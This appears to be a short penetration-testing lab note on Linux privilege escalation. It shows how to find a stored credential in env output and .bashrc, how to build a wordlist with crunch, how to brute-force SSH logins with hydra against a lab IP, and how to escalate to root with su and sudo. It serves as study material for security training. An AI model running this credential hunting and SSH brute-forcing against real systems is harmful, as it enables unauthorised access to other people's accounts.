# Searching For Sensitive Information



## env

```
$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```



## UNIX dot files

```
$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
...
```



## Brute Force

Once we access a low level user we can try to brute force other users while we continue to do enumerate the machine.

Create wordlist:

```
$ crunch 6 6 -t Lab%%% > wordlist
```

```
$ hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
```

## Low Hanging Fruit

```
$ su - root
Password:

# whoami
root
```

```
$ sudo -i
[sudo] password for eve:

# whoami
root
```

\
